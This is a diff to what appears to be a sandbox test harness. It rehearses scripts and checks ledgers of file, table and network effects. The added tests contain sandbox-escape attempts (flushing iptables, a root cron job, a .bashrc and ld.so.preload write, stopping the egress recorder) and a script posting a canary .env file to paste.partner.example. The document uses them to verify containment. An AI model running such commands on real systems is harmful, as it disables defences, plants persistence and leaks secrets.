@@ -17,6 +17,15 @@ rehearse() {  # rehearse NAME SCRIPT_FILE SCOPE_JSON
     --scope "$W/$name.scope.json" > "$W/$name.ledger.json"
 }
 
+SHOP_SQL=${SHOP_SQL:-/opt/rt/src/fixtures/prod/shop.sql}
+SRV_BACKUP="$W/srv-backup.tar"
+reseed() { psql -X -q -v ON_ERROR_STOP=1 -d shop -f "$SHOP_SQL" >/dev/null; }
+restore_srv() {  # put /srv back exactly as it was before the file rehearsals
+  local srv=/srv
+  rm -rf -- "${srv:?}"/*
+  tar -C / -xpf "$SRV_BACKUP"
+}
+
 cat > "$W/reprice_winter.sh" <<'EOF'
 psql shop -c "UPDATE prices SET amount = round(amount * 1.10, 2) WHERE category = 'winter' OR category = 'snow' AND active"
 EOF
@@ -30,6 +39,17 @@ for t in $(psql shop -Atc "select tablename from pg_tables where schemaname='pub
 done
 EOF
 printf '%s\n' customers products prices sessions webhooks api_keys > "$W/schema_tables.txt"
+cat > "$W/migrate_safe.sh" <<'EOF'
+psql shop -v ON_ERROR_STOP=1 <<'SQL'
+BEGIN;
+DROP TABLE legacy_orders;
+COMMIT;
+SQL
+EOF
+cat > "$W/cleanup_safe.sh" <<'EOF'
+rm -rf -- /srv/app/tmp/cache/*
+psql shop -c "DELETE FROM sessions WHERE expires_at < now()"
+EOF
 cat > "$W/cleanup.sh" <<'EOF'
 APP_ROOT=/srv
 CACHE_SUBDIR="${CACHE_SUBDIR}"
@@ -41,7 +61,10 @@ EOF
 rehearse reprice "$W/reprice_winter.sh" '{"tables": {"prices": {"max_rows": 31}}, "hosts": []}' || echo "rehearse reprice failed"
 rehearse safe1 "$W/reprice_safe.sh" '{"tables": {"prices": {"max_rows": 31}}, "hosts": ["hooks.partner.example"]}' || echo "rehearse safe1 failed"
 rehearse safe2 "$W/reprice_safe.sh" '{"tables": {"prices": {"max_rows": 31}}, "hosts": ["hooks.partner.example"]}' || echo "rehearse safe2 failed"
+rehearse migrate_safe "$W/migrate_safe.sh" '{"tables": ["legacy_orders"]}' || echo "rehearse migrate_safe failed"
+reseed
 rehearse migrate "$W/migrate_0042.sh" '{"tables": ["legacy_orders"]}' || echo "rehearse migrate failed"
+tar -C / -cpf "$SRV_BACKUP" srv
 # Escape attempts from inside the sandbox: each must fail, the in-scope delete must work.
 cat > "$W/escape.sh" <<'EOF'
 iptables -F 2>&1; echo "R iptables=$?"
@@ -51,7 +74,8 @@ systemd-run --wait --quiet /bin/true 2>&1; echo "R systemd_run=$?"
 systemctl stop rt-egress 2>&1; echo "R systemctl=$?"
 echo '* * * * * root iptables -F' > /etc/cron.d/rt-escape; echo "R cron=$?"
 echo 'iptables -F' >> /root/.bashrc; echo "R bashrc=$?"
-echo /tmp/x.so > /etc/ld.so.preload; echo "R preload=$?"
+# Only where the empty preload list exists; on an older image a write would really land.
+if [ -e /etc/ld.so.preload ]; then echo /tmp/x.so > /etc/ld.so.preload; echo "R preload=$?"; else echo "R preload=skipped"; fi
 echo x > /opt/rt/bin/rtrace; echo "R tracer=$?"
 echo x > /usr/local/bin/rt-escape; echo "R usr=$?"
 echo x > /var/log/rt-egress/egress.jsonl; echo "R egress_log=$?"
@@ -62,6 +86,12 @@ echo "R literal_ip=$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 https:/
 rm -f /srv/app/tmp/cache/cache-00?.bin; echo "R rm=$?"
 exit 0
 EOF
+cat > "$W/exfil.sh" <<'EOF'
+cat /srv/app/.env.canary > /dev/null
+curl -s -o /dev/null -X POST --data-binary @/srv/app/.env.canary https://paste.partner.example/upload
+exit 0
+EOF
+rehearse exfil "$W/exfil.sh" '{"paths": [], "tables": [], "hosts": []}' || echo "rehearse exfil failed"
 rehearse escape "$W/escape.sh" '{"paths": ["/srv/app/tmp"], "tables": [], "hosts": []}' || echo "rehearse escape failed"
 
 # Controls (must differ): the same attempts in weaker sandboxes do get through.
@@ -75,6 +105,10 @@ systemd-run --wait --pipe --collect --quiet -p IPAddressDeny=any -p IPAddressAll
   > "$W/control_no_fake_range.txt" 2>&1
 grep -c '"host": "prod-api.internal"' /var/log/rt-egress/egress.jsonl > "$W/control_no_fake_range.records" || true
 
+restore_srv
+rehearse cleanup_safe "$W/cleanup_safe.sh" '{"paths": ["/srv/app/tmp"], "tables": ["sessions"], "hosts": []}' || echo "rehearse cleanup_safe failed"
+restore_srv
+reseed
 rehearse cleanup "$W/cleanup.sh" '{"paths": ["/srv/app/tmp"], "tables": ["sessions"], "hosts": []}' || echo "rehearse cleanup failed"
 
 # Limits: memory (OOM kill), pids, wall time.
@@ -105,7 +139,7 @@ def check(name, ok, detail=""):
 canaries = json.load(open("/opt/rt/canaries.json"))["canaries"]
 tokens = [c["token"] for c in canaries]
 
-for name in ("reprice", "safe1", "safe2", "migrate", "cleanup"):
+for name in ("reprice", "safe1", "safe2", "migrate_safe", "migrate", "exfil", "escape", "cleanup_safe", "cleanup"):
     led = load(f"{name}.ledger.json")
     blob = json.dumps(led)
     check(f"{name}: hash matches content", led["ledger_sha256"] == ledger_sha256(led))
@@ -132,6 +166,15 @@ cmp = compare(s1, s2)
 check("compare: two safe runs match", cmp["match"], cmp["surprises"][:3])
 print(f"      compare counts {cmp['counts']}")
 
+ms = load("migrate_safe.ledger.json")
+check("migrate_safe: only legacy_orders dropped, in scope",
+      sorted(t for t, ch in ms["rows"].items() if ch.get("dropped")) == ["legacy_orders"]
+      and ms["summary"]["verdict"] == "in_scope", (ms["rows"], ms["out_of_scope"][:3]))
+cs0 = load("cleanup_safe.ledger.json")
+check("cleanup_safe: 150 cache files, sessions -240, no egress, in scope",
+      len(cs0["files"]["deleted"]) == 150 and cs0["rows"].get("sessions", {}).get("deleted") == 240
+      and cs0["egress"] == [] and cs0["summary"]["verdict"] == "in_scope",
+      (len(cs0["files"]["deleted"]), cs0["rows"], cs0["out_of_scope"][:3]))
 m = load("migrate.ledger.json")
 dropped = sorted(t for t, ch in m["rows"].items() if ch.get("dropped"))
 check("migrate: legacy_orders, orders, audit_log dropped", dropped == ["audit_log", "legacy_orders", "orders"], dropped)
@@ -143,8 +186,7 @@ check("migrate: three DROP statements in sql[]", len(drops) == 3, [s["statement"
 c = load("cleanup.ledger.json")
 deleted = c["files"]["deleted"]
 in_tmp = [p for p in deleted if p.startswith("/srv/app/tmp/")]
-check("cleanup: the 141 cache files left after the escape run deleted (in scope)", len(in_tmp) == 141,
-      len(in_tmp))
+check("cleanup: 150 cache files deleted (in scope)", len(in_tmp) == 150, len(in_tmp))
 check("cleanup: files outside /srv/app/tmp deleted", c["summary"]["files_out_of_scope"] > 0,
       c["summary"]["files_out_of_scope"])
 check("cleanup: sessions -240", c["rows"].get("sessions", {}).get("deleted") == 240, c["rows"])
@@ -163,6 +205,9 @@ marks = dict(l[2:].split("=", 1) for l in e["output"]["stdout_tail"].splitlines(
 print(f"      escape markers {marks}")
 for k in ("iptables", "iptables_nat", "route", "systemd_run", "systemctl", "cron", "bashrc", "preload", "tracer",
           "usr", "egress_log", "raw", "netlink"):
+    if marks.get(k) == "skipped":
+        print(f"      escape: {k} skipped (file absent on this image)")
+        continue
     check(f"escape: {k} refused inside the sandbox", marks.get(k) not in (None, "0", "127"), marks.get(k))
 check("escape: in-scope delete works", marks.get("rm") == "0", marks.get("rm"))
 check("escape: curl https://example.com answered by the recorder", marks.get("example") == "503", marks.get("example"))
@@ -178,6 +223,16 @@ ctl = open(os.path.join(W, "control_systemd_run.txt")).read().strip()
 check("control: with the probe's property set systemd-run from inside works (the hole is real)", ctl.endswith("0"), ctl)
 nf = open(os.path.join(W, "control_no_fake_range.txt")).read().strip()
 check("control: without the fake range allowed, the recorded call cannot complete", nf == "000", nf)
+x = load("exfil.ledger.json")
+xc = {c["id"]: c for c in x["canaries"]}["env-file"]
+check("exfil: decoy token sent outward is flagged", xc["exfil_attempt"] is True, xc)
+paste = [e for e in x["egress"] if e.get("host") == "paste.partner.example"]
+check("exfil: POST paste.partner.example recorded, 0 delivered", len(paste) == 1 and paste[0]["delivered"] == 0, paste)
+audit_on = os.system("systemctl is-active --quiet auditd") == 0
+if audit_on:
+    check("exfil: auditd saw the decoy file read", "read" in xc["evidence"], xc["evidence"])
+else:
+    print("      exfil: auditd not active here, read evidence not checked")
 o = load("oom.run.json")["limits"]
 check("limits: memory hog is OOM-killed", o["oom"] and load("oom.run.json")["exit"] != 0,
       {k: o[k] for k in ("oom", "oom_kills", "peak_mem_mb", "mem_max_mb")})
